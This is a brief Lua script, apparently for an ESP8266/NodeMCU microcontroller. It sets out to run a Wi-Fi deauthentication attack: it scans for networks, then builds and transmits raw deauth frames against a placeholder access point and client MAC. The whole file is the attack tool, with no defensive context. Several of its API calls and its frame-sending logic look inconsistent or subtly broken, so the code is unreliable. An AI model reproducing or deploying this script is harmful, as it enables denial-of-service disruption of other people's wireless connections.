-- deauth.lua
print("Starting deauth attack")

wifi.setmode(wifi.STATION)
wifi.startscan()

local function deauth(bssid, client_mac, channel)
    wifi.setmode(wifi.NULLMODE, true) -- Disable active WiFi connection
    wifi.setphymode(wifi.PHYMODE_N) -- Set PHY mode (N, B, G)

    wifi.promiscuous(function(packet)
        -- Create a deauthentication frame
        local deauth_frame = "\xC0\x00" .. -- Frame Control
                             "\x00\x00" .. -- Duration
                             bssid ..      -- Receiver (AP BSSID)
                             client_mac .. -- Transmitter (client MAC)
                             bssid ..      -- BSSID
                             "\x00\x00" .. -- Sequence Number
                             "\x07\x00"    -- Reason Code (7 = Class 3 frame received)

        -- Send the packet
        wifi.send_raw(deauth_frame, channel)
    end)

    print("Deauth attack started on channel " .. channel)
    tmr.create():alarm(1000, tmr.ALARM_SINGLE, function()
        wifi.promiscuous(nil) -- Stop promiscuous mode
        print("Deauth attack stopped.")
    end)
end

local function scan_done(tbl)
    print("Scan completed:")
    for ssid, v in pairs(tbl) do
        print(ssid, v.bssid, v.channel)
    end
end

wifi.scan(
    { hidden = true },
    function(err, tbl)
        if err then
            print("Scan error:", err)
        else
            scan_done(tbl)
        end
    end
)

-- Replace with the target AP BSSID, Client MAC, and channel
deauth("\xAA\xBB\xCC\xDD\xEE\xFF", "\x11\x22\x33\x44\x55\x66", 6)
